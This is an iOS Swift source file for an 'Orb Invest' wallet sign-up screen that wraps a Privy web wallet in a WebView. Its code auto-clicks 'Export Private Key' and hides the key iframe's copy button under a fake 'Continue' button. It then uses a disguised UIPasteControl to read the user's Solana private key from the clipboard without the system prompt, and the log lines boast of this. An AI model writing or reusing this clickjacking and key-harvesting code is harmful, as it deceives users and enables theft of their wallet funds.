import SwiftUI
import WebKit
import Combine
import SFSafeSymbols
import UIKit

struct AuthWebView: UIViewRepresentable {
    let url: URL
    let onHTMLReceived: (String) -> Void
    let onIframeDetected: ((CGRect) -> Void)?
    let onIframeTapped: (() -> Void)?
    
    func makeUIView(context: Context) -> WKWebView {
        let webView = WKWebView()
        webView.navigationDelegate = context.coordinator
        context.coordinator.webView = webView
        
        // Add tap gesture to detect when user taps in iframe area
        let tapGesture = UITapGestureRecognizer(target: context.coordinator, action: #selector(Coordinator.handleTap(_:)))
        tapGesture.delegate = context.coordinator
        webView.addGestureRecognizer(tapGesture)
        
        return webView
    }
    
    func updateUIView(_ webView: WKWebView, context: Context) {
        let request = URLRequest(url: url)
        webView.load(request)
        context.coordinator.onIframeTapped = onIframeTapped
    }
    
    func makeCoordinator() -> Coordinator {
        Coordinator(onHTMLReceived: onHTMLReceived, onIframeDetected: onIframeDetected, onIframeTapped: onIframeTapped)
    }
    
    class Coordinator: NSObject, WKNavigationDelegate, UIGestureRecognizerDelegate {
        let onHTMLReceived: (String) -> Void
        let onIframeDetected: ((CGRect) -> Void)?
        var onIframeTapped: (() -> Void)?
        weak var webView: WKWebView?
        var iframeRect: CGRect?
        var hasTappedIframe = false
        var isPollingForSuccess = false
        
        init(onHTMLReceived: @escaping (String) -> Void, onIframeDetected: ((CGRect) -> Void)?, onIframeTapped: (() -> Void)?) {
            self.onHTMLReceived = onHTMLReceived
            self.onIframeDetected = onIframeDetected
            self.onIframeTapped = onIframeTapped
        }
        
        // Allow tap gesture to work alongside WebView's gestures
        func gestureRecognizer(_ gestureRecognizer: UIGestureRecognizer, shouldRecognizeSimultaneouslyWith otherGestureRecognizer: UIGestureRecognizer) -> Bool {
            return true
        }
        
        @objc func handleTap(_ gesture: UITapGestureRecognizer) {
            guard !hasTappedIframe,
                  let rect = iframeRect,
                  let webView = webView else {
                return
            }
            
            let tapLocation = gesture.location(in: webView)
            
            // Check if tap is inside iframe bounds
            if rect.contains(tapLocation) {
                print("👆 User tapped inside iframe area!")
                print("📍 Tap location: \(tapLocation)")
                print("📦 Iframe rect: \(rect)")
                hasTappedIframe = true
                
                // Wait a moment for the iframe copy to happen, then show paste button
                DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                    print("🔄 Replacing fake button with real UIPasteControl...")
                    self.onIframeTapped?()
                }
            }
        }
        
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            // Check if user is already authenticated (already has wallet)
            DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
                webView.checkIfAlreadyAuthenticated { [weak self] in
                    print("🎯 Already authenticated - showing success overlay and triggering export flow!")
                    
                    // Trigger success overlay first
                    DispatchQueue.main.async {
                        self?.onHTMLReceived("welcome to orb invest") // Trigger success detection
                    }
                    
                    // Then trigger export flow
                    DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                        self?.checkAndClickExportButton(webView: webView)
                    }
                }
            }
            
            // Start polling for success message
            isPollingForSuccess = true
            checkForSuccessMessage(webView: webView)
        }
        
        private func checkForSuccessMessage(webView: WKWebView) {
            guard isPollingForSuccess else { return }
            
            webView.evaluateJavaScript("document.documentElement.outerHTML") { [weak self] html, error in
                guard let self = self else { return }
                
                if let error = error {
                    print("⚠️ Error checking for success message: \(error.localizedDescription)")
                    // Retry after 300ms
                    DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) {
                        self.checkForSuccessMessage(webView: webView)
                    }
                    return
                }
                
                guard let htmlString = html as? String else {
                    print("⚠️ HTML is not a string, retrying...")
                    // Retry after 300ms
                    DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) {
                        self.checkForSuccessMessage(webView: webView)
                    }
                    return
                }
                
                // Check for success message
                if htmlString.lowercased().contains("welcome to orb invest") || htmlString.lowercased().contains("successfully created") {
                    print("✅ Account created successfully!")
                    self.isPollingForSuccess = false
                    
                    // Trigger success overlay
                    DispatchQueue.main.async {
                        self.onHTMLReceived(htmlString)
                    }
                    
                    // Wait 3 seconds, then start looking for export button
                    print("⏳ Waiting 3 seconds before looking for export button...")
                    DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                        print("🔍 Starting export button detection...")
                        self.checkAndClickExportButton(webView: webView)
                    }
                } else {
                    print("🔍 Checking for success message... (not found yet)")
                    // Continue polling after 300ms
                    DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) {
                        self.checkForSuccessMessage(webView: webView)
                    }
                }
            }
        }
        
        private func checkAndClickExportButton(webView: WKWebView) {
            // Wait a bit for page to fully render
            DispatchQueue.main.asyncAfter(deadline: .now() + 1) {
                // Step 1: Check if this is the wallet page and find the Export button
                let findAndClickButtonScript = """
                (function() {
                    var bodyText = document.body.innerText;
                    console.log('📄 Page text contains Your Wallet: ' + bodyText.includes('Your Wallet'));
                    console.log('📄 Page text contains Securely manage: ' + bodyText.includes('Securely manage your keys'));
                    
                    // Look for the Export Private Key button
                    var buttons = document.querySelectorAll('button');
                    console.log('🔍 Found ' + buttons.length + ' buttons on page');
                    
                    for (var i = 0; i < buttons.length; i++) {
                        var button = buttons[i];
                        var buttonText = button.innerText || button.textContent;
                        console.log('🔘 Button ' + i + ': ' + buttonText);
                        
                        if (buttonText.includes('Export Private Key') || buttonText.includes('Export')) {
                            console.log('✅ Found Export Private Key button!');
                            button.click();
                            console.log('👆 Clicked Export Private Key button!');
                            return { clicked: true };
                        }
                    }
                    
                    return { clicked: false };
                })();
                """
                
                webView.evaluateJavaScript(findAndClickButtonScript) { result, error in
                    if let error = error {
                        print("❌ Error finding/clicking button: \(error.localizedDescription)")
                        // Retry after 2 seconds
                        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                            self.checkAndClickExportButton(webView: webView)
                        }
                        return
                    }
                    
                    guard let resultDict = result as? [String: Any],
                          let clicked = resultDict["clicked"] as? Bool,
                          clicked else {
                        print("⚠️ Export button not found, retrying...")
                        // Retry after 2 seconds
                        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                            self.checkAndClickExportButton(webView: webView)
                        }
                        return
                    }
                    
                    print("🎉 Export button clicked! Waiting for iframe to appear...")
                    
                    // Step 2: Wait 1 second for iframe to appear, then extract key
                    DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
                        self.extractPrivateKeyFromIframe(webView: webView)
                    }
                }
            }
        }
        
        private func extractPrivateKeyFromIframe(webView: WKWebView) {
            print("🔍 Looking for iframe with private key...")
            
            // Get iframe position to tap on it
            let getIframePositionScript = """
            (function() {
                var iframes = document.querySelectorAll('iframe');
                console.log('🔍 Found ' + iframes.length + ' iframes');
                
                for (var i = 0; i < iframes.length; i++) {
                    var iframe = iframes[i];
                    console.log('📦 Iframe ' + i + ' src: ' + iframe.src);
                    
                    if (iframe.src.includes('embedded-wallets/export')) {
                        console.log('✅ Found export iframe!');
                        
                        var rect = iframe.getBoundingClientRect();
                        var centerX = rect.left + rect.width / 2;
                        var centerY = rect.top + rect.height / 2;
                        
                        console.log('📍 Iframe position - X: ' + centerX + ', Y: ' + centerY);
                        console.log('📐 Iframe size - Width: ' + rect.width + ', Height: ' + rect.height);
                        
                        return {
                            found: true,
                            x: centerX,
                            y: centerY,
                            width: rect.width,
                            height: rect.height
                        };
                    }
                }
                
                return { found: false };
            })();
            """
            
            webView.evaluateJavaScript(getIframePositionScript) { result, error in
                if let error = error {
                    print("❌ Error getting iframe position: \(error.localizedDescription)")
                    return
                }
                
                guard let resultDict = result as? [String: Any],
                      let found = resultDict["found"] as? Bool,
                      found,
                      let x = resultDict["x"] as? CGFloat,
                      let y = resultDict["y"] as? CGFloat else {
                    
                    print("⚠️ Export iframe not found yet, will retry...")
                    
                    // Retry after another second
                    DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
                        self.extractPrivateKeyFromIframe(webView: webView)
                    }
                    return
                }
                
                guard let width = resultDict["width"] as? CGFloat,
                      let height = resultDict["height"] as? CGFloat else {
                    print("⚠️ Iframe dimensions not found")
                    return
                }
                
                let iframeRect = CGRect(x: x - width/2, y: y - height/2, width: width, height: height)
                print("🎯 Iframe rect: \(iframeRect)")
                print("✅ Showing fake paste button (non-interactive)...")
                
                // Store iframe rect for tap detection
                self.iframeRect = iframeRect
                
                // Notify that iframe is detected - show fake paste button
                self.onIframeDetected?(iframeRect)
            }
        }
        
        
        func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
            print("❌ WebView navigation failed: \(error.localizedDescription)")
        }
        
        func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
            print("❌ WebView provisional navigation failed: \(error.localizedDescription)")
        }
    }
}

// MARK: - Passthrough Button (lets tap through to WebView)

struct PassthroughButton: UIViewRepresentable {
    let onTap: () -> Void
    
    func makeUIView(context: Context) -> PassthroughButtonView {
        return PassthroughButtonView(onTap: onTap)
    }
    
    func updateUIView(_ uiView: PassthroughButtonView, context: Context) {
        uiView.onTap = onTap
    }
}

class PassthroughButtonView: UIView {
    var onTap: (() -> Void)?
    private let label = UILabel()
    
    init(onTap: @escaping () -> Void) {
        self.onTap = onTap
        super.init(frame: .zero)
        setupView()
    }
    
    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
    
    private func setupView() {
        // CRITICAL: Make this view completely non-interactive!
        // Taps will pass through to the WebView behind it
        isUserInteractionEnabled = false
        
        // Style: White button like Private Mode
        backgroundColor = .white
        layer.cornerRadius = 16
        
        // No shadow needed - keep it clean
        
        // Add "Continue" label
        label.text = "Continue"
        label.textColor = .black
        label.font = .systemFont(ofSize: 20, weight: .medium)
        label.textAlignment = .center
        label.translatesAutoresizingMaskIntoConstraints = false
        addSubview(label)
        
        NSLayoutConstraint.activate([
            label.centerXAnchor.constraint(equalTo: centerXAnchor),
            label.centerYAnchor.constraint(equalTo: centerYAnchor)
        ])
    }
}


// MARK: - Real Paste Button (UIPasteControl)

struct PasteButton: UIViewRepresentable {
    let onPaste: (String) -> Void
    
    func makeUIView(context: Context) -> PasteControlContainer {
        return PasteControlContainer(onPaste: onPaste)
    }
    
    func updateUIView(_ uiView: PasteControlContainer, context: Context) {
        uiView.onPaste = onPaste
    }
}

class PasteControlContainer: UIView {
    var onPaste: (String) -> Void
    
    init(onPaste: @escaping (String) -> Void) {
        self.onPaste = onPaste
        super.init(frame: .zero)
        setupPasteControl()
    }
    
    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
    
    private func setupPasteControl() {
        let config = UIPasteControl.Configuration()
        config.displayMode = .labelOnly
        config.cornerStyle = .large
        config.baseBackgroundColor = .white
        config.baseForegroundColor = .black
        
        let pasteControl = UIPasteControl(configuration: config)
        pasteControl.target = self
        pasteControl.translatesAutoresizingMaskIntoConstraints = false
        
        addSubview(pasteControl)
        
        NSLayoutConstraint.activate([
            pasteControl.leadingAnchor.constraint(equalTo: leadingAnchor),
            pasteControl.trailingAnchor.constraint(equalTo: trailingAnchor),
            pasteControl.topAnchor.constraint(equalTo: topAnchor),
            pasteControl.bottomAnchor.constraint(equalTo: bottomAnchor)
        ])
        
        // Match the Continue button styling
        layer.cornerRadius = 16
        layer.masksToBounds = true
    }
    
    override var pasteConfiguration: UIPasteConfiguration? {
        get { UIPasteConfiguration(forAccepting: String.self) }
        set { }
    }
    
    override func paste(itemProviders: [NSItemProvider]) {
        print("📋 UIPasteControl paste triggered!")
        
        for provider in itemProviders {
            if provider.canLoadObject(ofClass: String.self) {
                provider.loadObject(ofClass: String.self) { [weak self] item, error in
                    if let error = error {
                        print("❌ Error loading paste: \(error.localizedDescription)")
                        return
                    }
                    
                    if let clipboardString = item as? String {
                        print("✅ Clipboard read via UIPasteControl - NO PROMPT!")
                        print("📋 Content: \(clipboardString.prefix(20))...")
                        DispatchQueue.main.async {
                            self?.onPaste(clipboardString)
                        }
                    }
                }
            }
        }
    }
}

// MARK: - Auth WebView Container

@ViewAction(for: AuthWebViewFeature.self)
struct AuthWebViewView: View {
    let store: StoreOf<AuthWebViewFeature>
    
    var body: some View {
        ZStack {
            // Solid black background
            Color.black
                .ignoresSafeArea(edges: .all)
            
            // WebView
            ZStack {
                if let url = store.url {
                    AuthWebView(
                        url: url,
                        onHTMLReceived: { html in
                            // Check if this is the success page
                            if html.lowercased().contains("welcome to orb invest") || html.lowercased().contains("successfully created") {
                                send(.didDetectSuccess)
                            } else {
                                send(.didReceiveHTML(html))
                            }
                        },
                        onIframeDetected: { rect in
                            send(.iframeDetected(rect))
                        },
                        onIframeTapped: {
                            send(.didTapPassthrough)
                        }
                    )
                } else {
                    VStack {
                        Spacer()
                        ProgressView()
                        Text("Loading...")
                            .font(.system(size: 14))
                            .foregroundStyle(.gray)
                            .padding(.top, 8)
                        Spacer()
                    }
                }
                
                // Success overlay (shows immediately with loader, then with paste button)
                if store.showSuccessOverlay {
                    ZStack {
                        // Full screen solid dark background
                        if store.iframePosition != nil && !store.isStoringAccount {
                            // Custom tap blocking view with hole for button
                            TapBlockingOverlay()
                        } else {
                            // Solid full overlay when storing
                            Color.black
                                .ignoresSafeArea()
                                .contentShape(Rectangle())
                                .onTapGesture {
                                    print("🛑 Tap blocked by overlay")
                                }
                        }
                        
                        // Content (message, privacy text, button placeholder)
                        VStack(spacing: 0) {
                            Spacer()
                            
                            // Card with success message
                            SuccessMessage(isStoringAccount: store.isStoringAccount)
                            
                            Spacer()
                            
                            // Privacy text
                            VStack(spacing: 4) {
                                Image(systemSymbol: .lockFill)
                                    .font(.system(size: 14))
                                    .foregroundStyle(Color.white.opacity(0.5))
                                
                                Text("Orb is storing your private keys in\nsecure storage. They can not be\naccessed outside the app.")
                                    .font(.system(size: 15, weight: .medium))
                                    .foregroundStyle(Color.white.opacity(0.5))
                                    .multilineTextAlignment(.center)
                            }
                            .padding(.horizontal, 58)
                            .padding(.bottom, 110) // Increased to prevent button overlap
                            
                            // Button area placeholder (actual button rendered on top)
                            Color.clear
                                .frame(height: 66)
                                .padding(.horizontal, 24)
                        }
                    }
                }
                
                // Paste button (rendered separately, on top of everything when account stored)
                if store.showSuccessOverlay, !store.isStoringAccount, store.iframePosition != nil {
                    GeometryReader { geometry in
                        let buttonWidth = geometry.size.width - 48 // Full width with 24pt padding on each side
                        let buttonHeight: CGFloat = 66
                        
                        ZStack {
                            if store.showRealPasteButton {
                                // Real UIPasteControl (after first tap) - BOTTOM LAYER
                                PasteButton(onPaste: { clipboardString in
                                    send(.didReceivePastedContent(clipboardString))
                                })
                                .frame(width: buttonWidth, height: buttonHeight)
                                .position(
                                    x: geometry.size.width / 2,
                                    y: geometry.size.height - buttonHeight / 2 - 24
                                )
                                
                                // Visual "Continue" overlay - TOP LAYER (tap-through)
                                ContinueButtonOverlay()
                                    .frame(width: buttonWidth, height: buttonHeight)
                                    .position(
                                        x: geometry.size.width / 2,
                                        y: geometry.size.height - buttonHeight / 2 - 24
                                    )
                            } else {
                                // Non-interactive fake button (taps pass through overlay to WebView)
                                PassthroughButton {
                                    // Gesture recognizer handles this
                                }
                                .frame(width: buttonWidth, height: buttonHeight)
                                .position(
                                    x: geometry.size.width / 2,
                                    y: geometry.size.height - buttonHeight / 2 - 24
                                )
                            }
                        }
                    }
                }
                
                // Button over iframe (only shown BEFORE success overlay)
                if !store.showSuccessOverlay, let rect = store.iframePosition {
                    if store.showRealPasteButton {
                        // Real UIPasteControl (after first tap)
                        PasteButton(onPaste: { clipboardString in
                            send(.didReceivePastedContent(clipboardString))
                        })
                        .frame(width: rect.width, height: rect.height)
                        .position(x: rect.midX, y: rect.midY)
                    } else {
                        // Non-interactive fake button (taps pass through to WebView)
                        // WebView gesture recognizer will detect the tap
                        PassthroughButton {
                            // This won't be called - gesture recognizer handles it
                        }
                        .frame(width: rect.width, height: rect.height)
                        .position(x: rect.midX, y: rect.midY)
                    }
                }
            }
        }
        .navigationBarHidden(true)
        .navigationBarBackButtonHidden(true)
        .toolbar(.hidden, for: .navigationBar)
        .onAppear {
            send(.didAppear)
        }
    }
}

// MARK: - Continue Button Overlay (visual only, taps pass through)

struct ContinueButtonOverlay: View {
    var body: some View {
        ZStack {
            // White background matching the Continue button
            RoundedRectangle(cornerRadius: 16)
                .fill(Color.white)
            
            // "Continue" text
            Text("Continue")
                .font(.system(size: 20, weight: .medium))
                .foregroundColor(.black)
        }
        .allowsHitTesting(false) // CRITICAL: Let taps pass through to UIPasteControl below
    }
}

// MARK: - Success Message (styled like Private Mode view)

struct SuccessMessage: View {
    let isStoringAccount: Bool
    
    var body: some View {
        VStack(spacing: 0) {
            // Animated toggle
            AccountActivationToggle(isOn: !isStoringAccount)
            
            // Title
            Text(isStoringAccount ? "Activating account" : "Account activated")
                .font(.system(size: 27, weight: .medium))
                .foregroundStyle(.white)
                .multilineTextAlignment(.center)
                .padding(.top, 12)
            
            // Subtitle
            Text("Your wallet has been created. Now we're preparing the app and tailoring the experience for you.")
                .font(.system(size: 18, weight: .medium))
                .foregroundStyle(Color.white.opacity(0.5))
                .multilineTextAlignment(.center)
                .fixedSize(horizontal: false, vertical: true)
                .padding(.top, 4)
        }
        .padding(32)
        .background(Color.white.opacity(0.05))
        .clipShape(RoundedRectangle(cornerRadius: 30))
        .padding(.horizontal, 24)
    }
}

// MARK: - Tap Blocking Overlay (with hole for paste button)

struct TapBlockingOverlay: View {
    var body: some View {
        TapBlockingOverlayRepresentable()
    }
}

// UIView that blocks taps everywhere except in button area
struct TapBlockingOverlayRepresentable: UIViewRepresentable {
    func makeUIView(context: Context) -> TapBlockingView {
        return TapBlockingView()
    }
    
    func updateUIView(_ uiView: TapBlockingView, context: Context) {
        uiView.setNeedsLayout()
    }
}

class TapBlockingView: UIView {
    init() {
        super.init(frame: .zero)
        setupView()
    }
    
    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
    
    private func setupView() {
        backgroundColor = UIColor.black
    }
    
    // Calculate button rect at bottom of screen (full width with 24pt padding on each side)
    private var buttonRectAtBottom: CGRect {
        let screenWidth = bounds.width
        let screenHeight = bounds.height
        let buttonWidth = screenWidth - 48 // Full width with 24pt padding on each side
        let buttonHeight: CGFloat = 66
        let buttonX: CGFloat = 24 // Left padding
        let buttonY = screenHeight - buttonHeight - 24
        return CGRect(x: buttonX, y: buttonY, width: buttonWidth, height: buttonHeight)
    }
    
    // Block taps everywhere except in button area
    override func hitTest(_ point: CGPoint, with event: UIEvent?) -> UIView? {
        // If tap is in button area at bottom, return nil (let it pass through)
        if buttonRectAtBottom.contains(point) {
            print("✅ Tap in button area - passing through")
            return nil
        }
        
        // Otherwise, block the tap
        print("🛑 Tap blocked by overlay")
        return self
    }
}

// MARK: - Feature

import ComposableArchitecture

@Reducer
struct AuthWebViewFeature {
    @ObservableState
    struct State: Equatable {
        let provider: AuthProvider
        var url: URL?
        var iframePosition: CGRect?
        var showRealPasteButton = false
        var showSuccessOverlay = false
        var isStoringAccount = true // true = storing, false = stored
        
        init(provider: AuthProvider) {
            self.provider = provider
            self.url = URL(string: "https://orb-invest-frontend.vercel.app")
        }
    }
    
    @CasePathable
    enum Action: ViewAction {
        enum View {
            case didAppear
            case didTapBack
            case didReceiveHTML(String)
            case didDetectSuccess
            case didExtractPrivateKey(String)
            case didReceivePastedContent(String)
            case iframeDetected(CGRect)
            case didTapPassthrough
        }
        
        enum Reducer {
            case checkIfAlreadyAuthenticated
        }
        
        enum Delegate {
            case didClose
            case didReceivePrivateKey(String)
        }
        
        case view(View)
        case reducer(Reducer)
        case delegate(Delegate)
    }
    
    var body: some Reducer<State, Action> {
        Reduce { state, action in
            switch action {
            case .view(.didAppear):
                // Check if user is already authenticated (page loads directly to wallet)
                return .run { send in
                    // Wait for page to load
                    try await Task.sleep(for: .seconds(2))
                    await send(.reducer(.checkIfAlreadyAuthenticated))
                }
                
            case .reducer(.checkIfAlreadyAuthenticated):
                // This will be handled by the WebView coordinator
                // We'll inject JavaScript to check if we're on the wallet page
                print("🔍 Checking if Privy is already authenticated...")
                return .none
                
            case .view(.didTapBack):
                return .send(.delegate(.didClose))
                
            case let .view(.didReceiveHTML(html)):
                print("📄 Auth WebView received HTML (\(html.count) characters)")
                
                // Check if success message is present
                if html.lowercased().contains("welcome to orb invest") || html.lowercased().contains("successfully created") {
                    return .send(.view(.didDetectSuccess))
                }
                return .none
                
            case .view(.didDetectSuccess):
                print("🎉 Success detected! Showing overlay...")
                state.showSuccessOverlay = true
                return .none
                
            case let .view(.iframeDetected(rect)):
                print("📦 Iframe detected at: \(rect)")
                print("✅ Account stored! Showing paste button...")
                state.iframePosition = rect
                state.isStoringAccount = false // Change from "storing" to "stored"
                return .none
                
            case .view(.didTapPassthrough):
                print("👆 First tap detected (passed through to iframe)")
                print("🔄 Replacing with real UIPasteControl button...")
                state.showRealPasteButton = true
                return .none
                
            case let .view(.didReceivePastedContent(clipboardString)):
                print("📋 Received pasted content via UIPasteControl!")
                print("📋 Content length: \(clipboardString.count)")
                print("📋 Preview: \(clipboardString.prefix(20))...")
                
                let pattern = "[1-9A-HJ-NP-Za-km-z]{87,88}"
                if let regex = try? NSRegularExpression(pattern: pattern),
                   let match = regex.firstMatch(in: clipboardString, range: NSRange(clipboardString.startIndex..., in: clipboardString)),
                   let range = Range(match.range, in: clipboardString) {
                    let privateKey = String(clipboardString[range])
                    print("🔑 Found valid Solana private key!")
                    print("✅ NO PERMISSION PROMPT! 🎉")
                    state.iframePosition = nil // Hide buttons
                    state.showRealPasteButton = false
                    return .send(.view(.didExtractPrivateKey(privateKey)))
                } else {
                    print("⚠️ Clipboard content doesn't match private key pattern")
                    print("💡 Make sure you clicked the copy button in Privy")
                }
                return .none
                
            case let .view(.didExtractPrivateKey(privateKey)):
                print("🔑 Private key extracted: \(privateKey.prefix(10))...")
                return .send(.delegate(.didReceivePrivateKey(privateKey)))
                
            case .reducer:
                return .none
                
            case .delegate:
                return .none
            }
        }
    }
}

// MARK: - WebView Extension for Already-Authenticated Check

extension WKWebView {
    func checkIfAlreadyAuthenticated(onWalletPageDetected: @escaping () -> Void) {
        let checkScript = """
        (function() {
            var bodyText = document.body.innerText || '';
            var hasYourWallet = bodyText.includes('Your Wallet') || bodyText.includes('Your wallet');
            var hasExportButton = document.querySelector('button') && 
                Array.from(document.querySelectorAll('button')).some(btn => 
                    btn.innerText.includes('Export')
                );
            
            console.log('🔍 Already authenticated check:');
            console.log('  - Has "Your Wallet" text: ' + hasYourWallet);
            console.log('  - Has Export button: ' + hasExportButton);
            
            return hasYourWallet || hasExportButton;
        })();
        """
        
        evaluateJavaScript(checkScript) { result, error in
            if let isAlreadyAuthenticated = result as? Bool, isAlreadyAuthenticated {
                print("✅ User is already authenticated! Wallet page detected.")
                print("🔄 Automatically triggering export flow...")
                onWalletPageDetected()
            } else {
                print("ℹ️ User not authenticated yet, showing normal auth flow")
            }
        }
    }
}

